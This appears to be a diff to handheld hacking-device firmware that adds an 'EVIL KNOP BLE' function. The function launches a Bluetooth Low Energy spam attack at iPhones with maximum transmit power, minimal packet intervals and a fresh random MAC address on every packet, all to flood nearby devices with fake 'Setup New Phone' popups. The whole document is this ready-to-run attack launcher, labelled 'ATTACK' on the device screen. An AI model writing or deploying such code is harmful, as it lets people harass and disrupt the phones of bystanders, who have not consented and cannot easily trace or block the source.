+
+// EVIL KNOP BLE - immediate max-power Apple Action spam ("Setup New Phone" popups)
+// Launches the strongest iPhone BLE barrage right away. Stops on ESC press.
+void evilKnopBleRun() {
+    BleSpamConfig config;
+    config.adv_ms = 3;                     // minimal advertisement interval for max packet rate
+    config.gap_ms = 3;                     // minimal gap between packets
+    config.tx_power = BLE_SPAM_TX_MAX;     // full transmit power
+    config.mac_rand_mode = BLE_SPAM_MAC_EVERY_PACKET; // fresh MAC every packet
+
+    BleSpamSelection selection;
+    selection.attack_type = BLE_SPAM_ATTACK_APPLE_ACTION;
+    selection.device_index = 1; // "Setup New Phone" (0 = Apple TV Setup, 1 = Setup New Phone)
+
+    // Draw a dedicated red-tinted banner so the user knows what launched
+    drawMainBorderWithTitle("EVIL KNOP BLE");
+    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
+    tft.setTextSize(FP);
+    tft.drawCentreString("ATTACK: Setup New Phone", tftWidth / 2, tftHeight / 2 - LH, 1);
+    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
+    tft.drawCentreString("iPhone BLE Spam @ MAX", tftWidth / 2, tftHeight / 2 + LH, 1);
+    tft.drawCentreString("Press ESC to stop", tftWidth / 2, tftHeight - 20, 1);
+    vTaskDelay(pdMS_TO_TICKS(1200));
+
+    bleSpamRunScreen(selection, config);
+}
